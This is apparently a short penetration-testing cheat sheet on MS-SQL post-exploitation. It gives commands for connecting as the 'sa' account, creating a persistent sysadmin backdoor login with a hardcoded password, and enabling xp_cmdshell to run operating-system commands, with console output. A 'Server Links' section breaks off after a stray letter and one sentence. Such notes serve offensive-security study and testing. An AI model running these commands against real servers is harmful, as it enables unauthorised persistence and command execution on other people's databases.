# MS-SQL Databases

## Connecting

```bash
sqsh -S 192.168.0.6 -U sa
```

## User Creation

For creating a sysadmin user to enable easy access to the database post-exploitation, we'll need to create a login and associated user for SQL authentication.  We can then assign this user sysadmin privileges.

```sql
CREATE LOGIN booj WITH PASSWORD = 'B00j123!'
CREATE USER booj for LOGIN booj
EXEC sp_addsrvrolemember @loginame = N'booj', @rolename = N'sysadmin'
```

## xp\_cmdshell

```sql
1> exec sp_configure 'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. 
(return status = 0)
1> reconfigure
2> go
1> exec sp_configure 'xp_cmdshell', 1
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> reconfigure
2> go
1> exec master..xp_cmdshell 'whoami' 
2> go
```

## Server Links

T

Since OpenQuery can only satisfy user queries, stored procedures or user creation is not possible and makes your escalation path much more difficult.


